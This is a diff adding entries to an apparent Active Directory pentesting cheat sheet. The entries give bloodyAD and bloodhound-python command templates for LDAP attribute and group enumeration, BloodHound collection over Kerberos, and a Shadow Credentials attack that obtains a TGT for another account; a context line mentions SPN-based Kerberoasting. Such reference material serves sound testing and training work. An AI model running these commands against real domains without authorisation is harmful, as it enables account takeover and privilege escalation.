@@ -115,4 +115,157 @@ set object bob servicePrincipalName -v 'fake/http'
 
 If the target user doesn't already have an SPN, adding one allows Kerberoasting.
 
+# BloodyAD - Read User Attributes
+
+## Purpose
+
+Read specific LDAP attributes from a user object.
+
+Useful for checking:
+
+- userAccountControl
+- accountExpires
+- logonHours
+- workstations
+- msDS-AllowedToDelegateTo
+- msDS-KeyCredentialLink
+- servicePrincipalName
+
+### Requirements
+
+- [ ] Valid credentials
+- [ ] LDAP read access (normally every authenticated user)
+
+### Command
+
+```bash
+bloodyAD \
+--host <DC_HOSTNAME> \
+-d <DOMAIN> \
+-u <USERNAME> \
+-p '<PASSWORD>' \
+-k \
+get object '<TARGET_USER>' \
+--attr <ATTRIBUTE1>,<ATTRIBUTE2>,<ATTRIBUTE3>
+```
+
+### Example
+
+```bash
+bloodyAD ... get object 'Administrator' \
+--attr userAccountControl,servicePrincipalName
+```
+
+---
+
+# BloodyAD - Read Group Membership
+
+## Purpose
+
+Check members of an Active Directory group.
+
+Useful for:
+
+- Domain Admins
+- Protected Users
+- Account Operators
+- Backup Operators
+- Custom privileged groups
+
+### Requirements
+
+- [ ] Valid credentials
+- [ ] LDAP read access
+
+### Command
+
+```bash
+bloodyAD \
+--host <DC_HOSTNAME> \
+-d <DOMAIN> \
+-u <USERNAME> \
+-p '<PASSWORD>' \
+-k \
+get object '<GROUP_NAME>' \
+--attr member
+```
+
+### Example
+
+```bash
+bloodyAD ... get object 'Domain Admins' --attr member
+```
+
+---
+
+# BloodHound-python - Collect AD Data using Kerberos
+
+## Purpose
+
+Collect Active Directory objects and attack paths for BloodHound.
+
+### Requirements
+
+- [ ] Valid credentials
+- [ ] LDAP access
+- [ ] DNS working
+- [ ] BloodHound-python installed
+
+### Command
+
+```bash
+bloodhound-python \
+-d <DOMAIN> \
+-u <USERNAME> \
+-p '<PASSWORD>' \
+-k \
+-ns <DNS_SERVER> \
+-dc <DC_HOSTNAME> \
+-c all \
+--zip \
+--auth-method kerberos
+```
+
+### Output
+
+Creates a BloodHound ZIP archive ready for import.
+
+---
+
+# BloodyAD - Shadow Credentials Attack
+
+## Purpose
+
+Add a Key Credential to another account for PKINIT authentication.
+
+This is commonly known as the Shadow Credentials attack.
+
+### Requirements
+
+- [ ] Write access to the target's `msDS-KeyCredentialLink`
+- [ ] GenericWrite
+- [ ] GenericAll
+- [ ] WriteProperty on msDS-KeyCredentialLink
+- [ ] Target account supports PKINIT
+
+### Command
+
+```bash
+bloodyAD \
+--host <DC_HOSTNAME> \
+-d <DOMAIN> \
+-u <USERNAME> \
+-k \
+add shadowCredentials '<TARGET_ACCOUNT>'
+```
+
+### Result
+
+- Generates a KeyCredential
+- Creates a Kerberos certificate
+- Produces a TGT for the target account
+- Stores a new `.ccache`
+
+This allows authenticating as the target without knowing its password.
+
 ---
